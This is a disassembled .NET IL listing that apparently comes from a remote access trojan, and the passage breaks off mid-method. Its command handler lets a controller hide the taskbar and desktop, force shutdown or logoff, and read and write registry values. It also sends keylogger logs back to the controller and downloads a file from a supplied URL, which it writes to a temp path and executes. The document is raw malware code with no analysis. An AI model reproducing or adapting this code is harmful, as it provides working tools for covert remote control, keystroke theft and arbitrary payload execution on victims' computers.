      IL_004c:  ldstr      "ERR"
      IL_0051:  stloc.0
      IL_0052:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0057:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_005c:  leave.s    IL_005e

    }  // end handler
    IL_005e:  ldloc.0
    IL_005f:  ret
  } // end of method OK::HWD

  .method public static pinvokeimpl("KERNEL32.DLL" winapi) 
          void  Beep(int32 freq,
                     int32 dur) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" autochar lasterr winapi) 
          native int  FindWindow(string lpClassName,
                                 string lpWindowName) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" autochar lasterr winapi) 
          bool  ShowWindow(native int hwnd,
                           int32 nCmdShow) cil managed preservesig
  {
  }
  .method public static void  Ind(uint8[] b) cil managed noinlining nooptimization
  {
    // Code size       4255 (0x109f)
    .maxstack  11
    .locals init (string[] V_0,
             uint8[] V_1,
             string V_2,
             class [System]System.Net.WebClient V_3,
             string V_4,
             uint8[] V_5,
             class [System]System.Net.WebClient V_6,
             string V_7,
             uint32 V_8,
             valuetype [System.Windows.Forms]System.Windows.Forms.MessageBoxButtons V_9,
             valuetype [System.Windows.Forms]System.Windows.Forms.MessageBoxIcon V_10,
             string V_11,
             string V_12,
             string V_13,
             int32 V_14,
             class [mscorlib]System.Exception V_15,
             class [mscorlib]System.Exception V_16,
             class [mscorlib]System.Exception V_17,
             class [mscorlib]System.Exception V_18,
             uint8[] V_19,
             object V_20,
             class [mscorlib]System.IO.MemoryStream V_21,
             int32 V_22,
             uint8[] V_23,
             object V_24,
             int32 V_25,
             string V_26,
             valuetype [System.Drawing]System.Drawing.Rectangle V_27,
             class [System.Drawing]System.Drawing.Bitmap V_28,
             class [System.Drawing]System.Drawing.Graphics V_29,
             valuetype [System.Drawing]System.Drawing.Size V_30,
             class [System.Drawing]System.Drawing.Bitmap V_31,
             class [mscorlib]System.IO.MemoryStream V_32,
             class [mscorlib]System.IO.MemoryStream V_33,
             string V_34,
             valuetype [System.Drawing]System.Drawing.Rectangle V_35,
             class [mscorlib]System.Exception V_36,
             int32 V_37,
             class [mscorlib]System.Exception V_38,
             class [mscorlib]System.Exception V_39,
             class [mscorlib]System.Exception V_40,
             class [mscorlib]System.Exception V_41,
             object[] V_42,
             bool[] V_43,
             int32 V_44,
             int32 V_45,
             class [mscorlib]System.Exception V_46,
             class [mscorlib]System.Exception V_47,
             class [mscorlib]System.Exception V_48)
    IL_0000:  ldarga.s   b
    IL_0002:  call       string j.OK::BS(uint8[]&)
    IL_0007:  ldsfld     string j.OK::Y
    IL_000c:  ldc.i4.m1
    IL_000d:  ldc.i4.0
    IL_000e:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
                                                                                              string,
                                                                                              int32,
                                                                                              valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.CompareMethod)
    IL_0013:  stloc.0
    .try
    {
      IL_0014:  ldloc.0
      IL_0015:  ldc.i4.0
      IL_0016:  ldelem.ref
      IL_0017:  stloc.2
      IL_0018:  ldloc.2
      IL_0019:  call       uint32 '<PrivateImplementationDetails>'::ComputeStringHash(string)
      IL_001e:  stloc.s    V_8
      IL_0020:  ldloc.s    V_8
      IL_0022:  ldc.i4     0xa8db785e
      IL_0027:  bgt.un.s   IL_009e

      IL_0029:  ldloc.s    V_8
      IL_002b:  ldc.i4     0x38276e70
      IL_0030:  bgt.un.s   IL_005b

      IL_0032:  ldloc.s    V_8
      IL_0034:  ldc.i4     0x10fe67e
      IL_0039:  beq        IL_01a4

      IL_003e:  ldloc.s    V_8
      IL_0040:  ldc.i4     0x34dc6912
      IL_0045:  beq        IL_01d0

      IL_004a:  ldloc.s    V_8
      IL_004c:  ldc.i4     0x38276e70
      IL_0051:  beq        IL_0136

      IL_0056:  br         IL_0514

      IL_005b:  ldloc.s    V_8
      IL_005d:  ldc.i4     0x433cfaf2
      IL_0062:  bgt.un.s   IL_0081

      IL_0064:  ldloc.s    V_8
      IL_0066:  ldc.i4     0x3e514fbe
      IL_006b:  beq        IL_01e6

      IL_0070:  ldloc.s    V_8
      IL_0072:  ldc.i4     0x433cfaf2
      IL_0077:  beq        IL_0212

      IL_007c:  br         IL_0514

      IL_0081:  ldloc.s    V_8
      IL_0083:  ldc.i4     0x4531c525
      IL_0088:  beq        IL_01fc

      IL_008d:  ldloc.s    V_8
      IL_008f:  ldc.i4     0xa8db785e
      IL_0094:  beq        IL_018e

      IL_0099:  br         IL_0514

      IL_009e:  ldloc.s    V_8
      IL_00a0:  ldc.i4     0xd5a43d84
      IL_00a5:  bgt.un.s   IL_00cd

      IL_00a7:  ldloc.s    V_8
      IL_00a9:  ldc.i4     0xaa5bd645
      IL_00ae:  beq        IL_014c

      IL_00b3:  ldloc.s    V_8
      IL_00b5:  ldc.i4     0xb94c4a37
      IL_00ba:  beq        IL_0178

      IL_00bf:  ldloc.s    V_8
      IL_00c1:  ldc.i4     0xd5a43d84
      IL_00c6:  beq.s      IL_010a

      IL_00c8:  br         IL_0514

      IL_00cd:  ldloc.s    V_8
      IL_00cf:  ldc.i4     0xdeb88809
      IL_00d4:  bgt.un.s   IL_00f0

      IL_00d6:  ldloc.s    V_8
      IL_00d8:  ldc.i4     0xd82ddf1e
      IL_00dd:  beq        IL_01ba

      IL_00e2:  ldloc.s    V_8
      IL_00e4:  ldc.i4     0xdeb88809
      IL_00e9:  beq.s      IL_0120

      IL_00eb:  br         IL_0514

      IL_00f0:  ldloc.s    V_8
      IL_00f2:  ldc.i4     0xef3e349a
      IL_00f7:  beq        IL_0228

      IL_00fc:  ldloc.s    V_8
      IL_00fe:  ldc.i4     0xf38d9cf1
      IL_0103:  beq.s      IL_0162

      IL_0105:  br         IL_0514

      IL_010a:  ldloc.2
      IL_010b:  ldstr      "HideTask"
      IL_0110:  ldc.i4.0
      IL_0111:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0116:  brfalse    IL_023e

      IL_011b:  br         IL_0514

      IL_0120:  ldloc.2
      IL_0121:  ldstr      "ShowTask"
      IL_0126:  ldc.i4.0
      IL_0127:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_012c:  brfalse    IL_0255

      IL_0131:  br         IL_0514

      IL_0136:  ldloc.2
      IL_0137:  ldstr      "HideDesk"
      IL_013c:  ldc.i4.0
      IL_013d:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0142:  brfalse    IL_026c

      IL_0147:  br         IL_0514

      IL_014c:  ldloc.2
      IL_014d:  ldstr      "ShowDesk"
      IL_0152:  ldc.i4.0
      IL_0153:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0158:  brfalse    IL_0283

      IL_015d:  br         IL_0514

      IL_0162:  ldloc.2
      IL_0163:  ldstr      "Error"
      IL_0168:  ldc.i4.0
      IL_0169:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_016e:  brfalse    IL_029a

      IL_0173:  br         IL_0514

      IL_0178:  ldloc.2
      IL_0179:  ldstr      "Speech"
      IL_017e:  ldc.i4.0
      IL_017f:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0184:  brfalse    IL_0387

      IL_0189:  br         IL_0514

      IL_018e:  ldloc.2
      IL_018f:  ldstr      "fun"
      IL_0194:  ldc.i4.0
      IL_0195:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_019a:  brfalse    IL_03ca

      IL_019f:  br         IL_0514

      IL_01a4:  ldloc.2
      IL_01a5:  ldstr      "Piano"
      IL_01aa:  ldc.i4.0
      IL_01ab:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_01b0:  brfalse    IL_03da

      IL_01b5:  br         IL_0514

      IL_01ba:  ldloc.2
      IL_01bb:  ldstr      "sht"
      IL_01c0:  ldc.i4.0
      IL_01c1:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_01c6:  brfalse    IL_0404

      IL_01cb:  br         IL_0514

      IL_01d0:  ldloc.2
      IL_01d1:  ldstr      "rst"
      IL_01d6:  ldc.i4.0
      IL_01d7:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_01dc:  brfalse    IL_0419

      IL_01e1:  br         IL_0514

      IL_01e6:  ldloc.2
      IL_01e7:  ldstr      "lof"
      IL_01ec:  ldc.i4.0
      IL_01ed:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_01f2:  brfalse    IL_042e

      IL_01f7:  br         IL_0514

      IL_01fc:  ldloc.2
      IL_01fd:  ldstr      "ll"
      IL_0202:  ldc.i4.0
      IL_0203:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0208:  brfalse    IL_0443

      IL_020d:  br         IL_0514

      IL_0212:  ldloc.2
      IL_0213:  ldstr      "kl"
      IL_0218:  ldc.i4.0
      IL_0219:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_021e:  brfalse    IL_044e

      IL_0223:  br         IL_0514

      IL_0228:  ldloc.2
      IL_0229:  ldstr      "prof"
      IL_022e:  ldc.i4.0
      IL_022f:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0234:  brfalse    IL_0477

      IL_0239:  br         IL_0514

      IL_023e:  ldstr      "Shell_TrayWnd"
      IL_0243:  ldnull
      IL_0244:  call       native int j.OK::FindWindow(string,
                                                       string)
      IL_0249:  ldc.i4.0
      IL_024a:  call       bool j.OK::ShowWindow(native int,
                                                 int32)
      IL_024f:  pop
      IL_0250:  leave      IL_109e

      IL_0255:  ldstr      "Shell_TrayWnd"
      IL_025a:  ldnull
      IL_025b:  call       native int j.OK::FindWindow(string,
                                                       string)
      IL_0260:  ldc.i4.4
      IL_0261:  call       bool j.OK::ShowWindow(native int,
                                                 int32)
      IL_0266:  pop
      IL_0267:  leave      IL_109e

      IL_026c:  ldstr      "Progman"
      IL_0271:  ldnull
      IL_0272:  call       native int j.OK::FindWindow(string,
                                                       string)
      IL_0277:  ldc.i4.0
      IL_0278:  call       bool j.OK::ShowWindow(native int,
                                                 int32)
      IL_027d:  pop
      IL_027e:  leave      IL_109e

      IL_0283:  ldstr      "Progman"
      IL_0288:  ldnull
      IL_0289:  call       native int j.OK::FindWindow(string,
                                                       string)
      IL_028e:  ldc.i4.4
      IL_028f:  call       bool j.OK::ShowWindow(native int,
                                                 int32)
      IL_0294:  pop
      IL_0295:  leave      IL_109e

      IL_029a:  ldc.i4.0
      IL_029b:  stloc.s    V_9
      IL_029d:  ldc.i4.0
      IL_029e:  stloc.s    V_10
      IL_02a0:  ldloc.0
      IL_02a1:  ldc.i4.1
      IL_02a2:  ldelem.ref
      IL_02a3:  stloc.s    V_11
      IL_02a5:  ldloc.s    V_11
      IL_02a7:  ldstr      "Error"
      IL_02ac:  ldc.i4.0
      IL_02ad:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_02b2:  brtrue.s   IL_02ba

      IL_02b4:  ldc.i4.s   64
      IL_02b6:  stloc.s    V_10
      IL_02b8:  br.s       IL_02f7

      IL_02ba:  ldloc.s    V_11
      IL_02bc:  ldstr      "Question"
      IL_02c1:  ldc.i4.0
      IL_02c2:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_02c7:  brtrue.s   IL_02cf

      IL_02c9:  ldc.i4.s   32
      IL_02cb:  stloc.s    V_10
      IL_02cd:  br.s       IL_02f7

      IL_02cf:  ldloc.s    V_11
      IL_02d1:  ldstr      "Warning"
      IL_02d6:  ldc.i4.0
      IL_02d7:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_02dc:  brtrue.s   IL_02e4

      IL_02de:  ldc.i4.s   48
      IL_02e0:  stloc.s    V_10
      IL_02e2:  br.s       IL_02f7

      IL_02e4:  ldloc.s    V_11
      IL_02e6:  ldstr      "Info"
      IL_02eb:  ldc.i4.0
      IL_02ec:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_02f1:  brtrue.s   IL_02f7

      IL_02f3:  ldc.i4.s   16
      IL_02f5:  stloc.s    V_10
      IL_02f7:  ldloc.0
      IL_02f8:  ldc.i4.2
      IL_02f9:  ldelem.ref
      IL_02fa:  stloc.s    V_12
      IL_02fc:  ldloc.s    V_12
      IL_02fe:  ldstr      "YesNo"
      IL_0303:  ldc.i4.0
      IL_0304:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0309:  brtrue.s   IL_0310

      IL_030b:  ldc.i4.4
      IL_030c:  stloc.s    V_9
      IL_030e:  br.s       IL_0372

      IL_0310:  ldloc.s    V_12
      IL_0312:  ldstr      "YesNoCancel"
      IL_0317:  ldc.i4.0
      IL_0318:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_031d:  brtrue.s   IL_0324

      IL_031f:  ldc.i4.3
      IL_0320:  stloc.s    V_9
      IL_0322:  br.s       IL_0372

      IL_0324:  ldloc.s    V_12
      IL_0326:  ldstr      "OK"
      IL_032b:  ldc.i4.0
      IL_032c:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0331:  brtrue.s   IL_0338

      IL_0333:  ldc.i4.0
      IL_0334:  stloc.s    V_9
      IL_0336:  br.s       IL_0372

      IL_0338:  ldloc.s    V_12
      IL_033a:  ldstr      "OKCancel"
      IL_033f:  ldc.i4.0
      IL_0340:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0345:  brtrue.s   IL_034c

      IL_0347:  ldc.i4.1
      IL_0348:  stloc.s    V_9
      IL_034a:  br.s       IL_0372

      IL_034c:  ldloc.s    V_12
      IL_034e:  ldstr      "RetryCancel"
      IL_0353:  ldc.i4.0
      IL_0354:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0359:  brtrue.s   IL_0360

      IL_035b:  ldc.i4.5
      IL_035c:  stloc.s    V_9
      IL_035e:  br.s       IL_0372

      IL_0360:  ldloc.s    V_12
      IL_0362:  ldstr      "AbortRetryCancel"
      IL_0367:  ldc.i4.0
      IL_0368:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_036d:  brtrue.s   IL_0372

      IL_036f:  ldc.i4.2
      IL_0370:  stloc.s    V_9
      IL_0372:  ldloc.0
      IL_0373:  ldc.i4.4
      IL_0374:  ldelem.ref
      IL_0375:  ldloc.0
      IL_0376:  ldc.i4.3
      IL_0377:  ldelem.ref
      IL_0378:  ldloc.s    V_9
      IL_037a:  ldloc.s    V_10
      IL_037c:  call       valuetype [System.Windows.Forms]System.Windows.Forms.DialogResult [System.Windows.Forms]System.Windows.Forms.MessageBox::Show(string,
                                                                                                                                                         string,
                                                                                                                                                         valuetype [System.Windows.Forms]System.Windows.Forms.MessageBoxButtons,
                                                                                                                                                         valuetype [System.Windows.Forms]System.Windows.Forms.MessageBoxIcon)
      IL_0381:  pop
      IL_0382:  leave      IL_109e

      IL_0387:  ldstr      "SAPI.spvoice"
      IL_038c:  ldstr      ""
      IL_0391:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::CreateObject(string,
                                                                                                         string)
      IL_0396:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_039b:  ldnull
      IL_039c:  ldstr      "speak"
      IL_03a1:  ldc.i4.1
      IL_03a2:  newarr     [mscorlib]System.Object
      IL_03a7:  dup
      IL_03a8:  ldc.i4.0
      IL_03a9:  ldc.i4.1
      IL_03aa:  newarr     [mscorlib]System.String
      IL_03af:  dup
      IL_03b0:  ldc.i4.0
      IL_03b1:  ldloc.0
      IL_03b2:  ldc.i4.1
      IL_03b3:  ldelem.ref
      IL_03b4:  stelem.ref
      IL_03b5:  call       string [mscorlib]System.String::Concat(string[])
      IL_03ba:  stelem.ref
      IL_03bb:  ldnull
      IL_03bc:  ldnull
      IL_03bd:  ldnull
      IL_03be:  ldc.i4.1
      IL_03bf:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_03c4:  pop
      IL_03c5:  leave      IL_109e

      IL_03ca:  ldstr      "fun"
      IL_03cf:  call       bool j.OK::Send(string)
      IL_03d4:  pop
      IL_03d5:  leave      IL_109e

      IL_03da:  ldc.i4.1
      IL_03db:  newarr     [mscorlib]System.String
      IL_03e0:  dup
      IL_03e1:  ldc.i4.0
      IL_03e2:  ldloc.0
      IL_03e3:  ldc.i4.1
      IL_03e4:  ldelem.ref
      IL_03e5:  stelem.ref
      IL_03e6:  call       string [mscorlib]System.String::Concat(string[])
      IL_03eb:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_03f0:  ldstr      "300"
      IL_03f5:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_03fa:  call       void j.OK::Beep(int32,
                                           int32)
      IL_03ff:  leave      IL_109e

      IL_0404:  ldstr      "Shutdown"
      IL_0409:  ldstr      "/s /t 00"
      IL_040e:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string,
                                                                                                              string)
      IL_0413:  pop
      IL_0414:  leave      IL_109e

      IL_0419:  ldstr      "Shutdown"
      IL_041e:  ldstr      "/r /t 00"
      IL_0423:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string,
                                                                                                              string)
      IL_0428:  pop
      IL_0429:  leave      IL_109e

      IL_042e:  ldstr      "Shutdown"
      IL_0433:  ldstr      "/l /f"
      IL_0438:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string,
                                                                                                              string)
      IL_043d:  pop
      IL_043e:  leave      IL_109e

      IL_0443:  ldc.i4.0
      IL_0444:  stsfld     bool j.OK::Cn
      IL_0449:  leave      IL_109e

      IL_044e:  ldstr      "kl"
      IL_0453:  ldsfld     string j.OK::Y
      IL_0458:  ldsfld     class j.kl j.OK::kq
      IL_045d:  ldflda     string j.kl::Logs
      IL_0462:  call       string j.OK::ENB(string&)
      IL_0467:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_046c:  call       bool j.OK::Send(string)
      IL_0471:  pop
      IL_0472:  leave      IL_109e

      IL_0477:  ldloc.0
      IL_0478:  ldc.i4.1
      IL_0479:  ldelem.ref
      IL_047a:  stloc.s    V_13
      IL_047c:  ldloc.s    V_13
      IL_047e:  ldstr      "~"
      IL_0483:  ldc.i4.0
      IL_0484:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0489:  brfalse.s  IL_04ab

      IL_048b:  ldloc.s    V_13
      IL_048d:  ldstr      "!"
      IL_0492:  ldc.i4.0
      IL_0493:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0498:  brfalse.s  IL_04ba

      IL_049a:  ldloc.s    V_13
      IL_049c:  ldstr      "@"
      IL_04a1:  ldc.i4.0
      IL_04a2:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_04a7:  brfalse.s  IL_0507

      IL_04a9:  br.s       IL_050f

      IL_04ab:  ldloc.0
      IL_04ac:  ldc.i4.2
      IL_04ad:  ldelem.ref
      IL_04ae:  ldloc.0
      IL_04af:  ldc.i4.3
      IL_04b0:  ldelem.ref
      IL_04b1:  ldc.i4.1
      IL_04b2:  call       bool j.OK::STV(string,
                                          object,
                                          valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_04b7:  pop
      IL_04b8:  br.s       IL_050f

      IL_04ba:  ldloc.0
      IL_04bb:  ldc.i4.2
      IL_04bc:  ldelem.ref
      IL_04bd:  ldloc.0
      IL_04be:  ldc.i4.3
      IL_04bf:  ldelem.ref
      IL_04c0:  ldc.i4.1
      IL_04c1:  call       bool j.OK::STV(string,
                                          object,
                                          valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_04c6:  pop
      IL_04c7:  ldstr      "getvalue"
      IL_04cc:  ldsfld     string j.OK::Y
      IL_04d1:  ldloc.0
      IL_04d2:  ldc.i4.1
      IL_04d3:  ldelem.ref
      IL_04d4:  ldsfld     string j.OK::Y
      IL_04d9:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_04de:  ldloc.0
      IL_04df:  ldc.i4.1
      IL_04e0:  ldelem.ref
      IL_04e1:  ldstr      ""
      IL_04e6:  call       object j.OK::GTV(string,
                                            object)
      IL_04eb:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_04f0:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_04f5:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_04fa:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_04ff:  call       bool j.OK::Send(string)
      IL_0504:  pop
      IL_0505:  br.s       IL_050f

      IL_0507:  ldloc.0
      IL_0508:  ldc.i4.2
      IL_0509:  ldelem.ref
      IL_050a:  call       void j.OK::DLV(string)
      IL_050f:  leave      IL_109e

      IL_0514:  ldloc.2
      IL_0515:  ldstr      "rn"
      IL_051a:  ldc.i4.0
      IL_051b:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0520:  brtrue     IL_06aa

      IL_0525:  ldloc.0
      IL_0526:  ldc.i4.2
      IL_0527:  ldelem.ref
      IL_0528:  ldc.i4.0
      IL_0529:  callvirt   instance char [mscorlib]System.String::get_Chars(int32)
      IL_052e:  ldc.i4.s   31
      IL_0530:  bne.un     IL_05b8

      .try
      {
        IL_0535:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_053a:  ldloc.0
        IL_053b:  ldc.i4.0
        IL_053c:  ldelem.ref
        IL_053d:  ldsfld     string j.OK::Y
        IL_0542:  ldloc.0
        IL_0543:  ldc.i4.1
        IL_0544:  ldelem.ref
        IL_0545:  ldsfld     string j.OK::Y
        IL_054a:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_054f:  callvirt   instance int32 [mscorlib]System.String::get_Length()
        IL_0554:  stloc.s    V_14
        IL_0556:  dup
        IL_0557:  ldarg.0
        IL_0558:  ldloc.s    V_14
        IL_055a:  ldarg.0
        IL_055b:  ldlen
        IL_055c:  conv.i4
        IL_055d:  ldloc.s    V_14
        IL_055f:  sub.ovf
        IL_0560:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_0565:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
        IL_056a:  call       uint8[] j.OK::ZIP(uint8[])
        IL_056f:  stloc.1
        IL_0570:  leave      IL_060d

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0575:  dup
        IL_0576:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_057b:  stloc.s    V_15
        IL_057d:  ldloc.s    V_15
        IL_057f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0584:  ldstr      "MSG"
        IL_0589:  ldsfld     string j.OK::Y
        IL_058e:  ldstr      "Execute ERROR"
        IL_0593:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0598:  call       bool j.OK::Send(string)
        IL_059d:  pop
        IL_059e:  ldstr      "bla"
        IL_05a3:  call       bool j.OK::Send(string)
        IL_05a8:  pop
        IL_05a9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_05ae:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_05b3:  leave      IL_109e

      }  // end handler
      IL_05b8:  newobj     instance void [System]System.Net.WebClient::.ctor()
      IL_05bd:  stloc.3
      .try
      {
        IL_05be:  ldloc.3
        IL_05bf:  ldloc.0
        IL_05c0:  ldc.i4.2
        IL_05c1:  ldelem.ref
        IL_05c2:  callvirt   instance uint8[] [System]System.Net.WebClient::DownloadData(string)
        IL_05c7:  stloc.1
        IL_05c8:  leave.s    IL_060d

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_05ca:  dup
        IL_05cb:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_05d0:  stloc.s    V_16
        IL_05d2:  ldloc.s    V_16
        IL_05d4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_05d9:  ldstr      "MSG"
        IL_05de:  ldsfld     string j.OK::Y
        IL_05e3:  ldstr      "Download ERROR"
        IL_05e8:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_05ed:  call       bool j.OK::Send(string)
        IL_05f2:  pop
        IL_05f3:  ldstr      "bla"
        IL_05f8:  call       bool j.OK::Send(string)
        IL_05fd:  pop
        IL_05fe:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0603:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0608:  leave      IL_109e

      }  // end handler
      IL_060d:  ldstr      "bla"
      IL_0612:  call       bool j.OK::Send(string)
      IL_0617:  pop
      IL_0618:  call       string [mscorlib]System.IO.Path::GetTempFileName()
      IL_061d:  ldstr      "."
      IL_0622:  ldloc.0
      IL_0623:  ldc.i4.1
      IL_0624:  ldelem.ref
      IL_0625:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_062a:  stloc.s    V_4
      .try
      {
        IL_062c:  ldloc.s    V_4
        IL_062e:  ldloc.1
        IL_062f:  call       void [mscorlib]System.IO.File::WriteAllBytes(string,
                                                                          uint8[])
        IL_0634:  ldloc.s    V_4
        IL_0636:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
        IL_063b:  pop
        IL_063c:  ldstr      "MSG"
        IL_0641:  ldsfld     string j.OK::Y
        IL_0646:  ldstr      "Executed As "
        IL_064b:  ldloc.s    V_4
        IL_064d:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
        IL_0652:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
        IL_0657:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_065c:  call       bool j.OK::Send(string)
        IL_0661:  pop
        IL_0662:  leave      IL_109e

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0667:  dup
